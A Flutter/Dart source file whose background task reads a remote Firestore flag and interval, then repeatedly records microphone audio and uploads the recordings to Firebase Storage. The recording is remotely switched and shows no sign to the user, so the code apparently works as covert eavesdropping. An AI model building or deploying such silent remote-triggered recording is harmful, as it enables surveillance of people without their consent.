import 'dart:io';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_storage/firebase_storage.dart';

import 'package:logger/logger.dart';
import 'package:path_provider/path_provider.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:record_mp3/record_mp3.dart';
import 'package:workmanager/workmanager.dart';

import '../services/core_module_services.dart';

@pragma(
    'vm:entry-point') // Mandatory if the App is obfuscated or using Flutter 3.1+
Future<void> callbackDispatcher() async {
  await initServices();

  Workmanager().executeTask((task, inputData) async {
    try {
      Logger().i(task);

      //-------------------Firebase-------------------
      final dataFromFirebase = await readAndWriteFirebaseData();
      if (dataFromFirebase) {
        Logger().i('Licença Status$dataFromFirebase');
      } else {
        Logger().e('Task is failed and will be retry');
        return false; //If False returned that means task is failed and will be retry.
      }
    } catch (err) {
      Logger().e(err.toString());
      throw Exception(err);
    }

    return true; //If True returned that means task is successfully completed.
  });
}

//Read data from firebase
Future<bool> readAndWriteFirebaseData() async {
  // Fetch from Firebase
  Logger().i('firebase conect...');
  final docData =
      FirebaseFirestore.instance.collection("configuracao").doc("options");
  final snapshot = await docData.get();
  Logger().i('firebase conected - ${snapshot.data()}');

  if (snapshot.exists) {
    final int time = snapshot.data()!['time_start'] ?? 15;
    final bool licenca = snapshot.data()!['licenca'] ?? false;
    if (licenca) {
      int repeat = 1;
      Logger().i('Repeat inicial $repeat of ${15 / time}');
      while (repeat < (15 / time)) {
        final path = await startRecord();
        Logger().i('record start');

        await Future.delayed(Duration(minutes: time));

        stopRecord();
        Logger().i('Stop recording');
        if (path != null) {
          Logger().i('Inicio Uploade FirebaseStorage');
          await _upload(path);
          Logger().i('Fim Uploade FirebaseStorage');
        }

        FirebaseFirestore.instance
            .collection("comandos")
            .doc("time")
            .collection("register")
            .doc()
            .set(
          {
            'road': DateTime.now(),
          },
        );

        repeat++;
        Logger().i('Repeat $repeat of ${15 / time}');
      }
    }

    return licenca;
  } else {
    return false;
  }
}

Future<void> _upload(String path) async {
  File file = File(path);

  try {
    String ref = 'record/rec-${DateTime.now().toString()}.mp3';
    await FirebaseStorage.instance.ref(ref).putFile(file);
  } catch (e) {
    Logger().e('erro no uploa');
  }
}

Future<bool> checkPermission() async {
  if (!await Permission.microphone.isGranted) {
    PermissionStatus status = await Permission.microphone.request();
    if (status != PermissionStatus.granted) {
      return false;
    }
  }
  return true;
}

Future<String> getFilePath() async {
  int i = 0;
  Directory storageDirectory = await getApplicationDocumentsDirectory();
  String sdPath = "${storageDirectory.path}/record";
  var d = Directory(sdPath);
  if (!d.existsSync()) {
    d.createSync(recursive: true);
  }
  return "$sdPath/test_${i++}.mp3";
}

Future<String?> startRecord() async {
  bool hasPermission = await checkPermission();
  if (hasPermission) {
    final recordFilePath = await getFilePath();

    final record = RecordMp3.instance.start(recordFilePath, (type) {
      Logger().e("Record error--->$type");
    });
    if (record) {
      return recordFilePath;
    } else {
      return null;
    }
  } else {
    return null;
  }
}

void stopRecord() {
  RecordMp3.instance.stop();
}
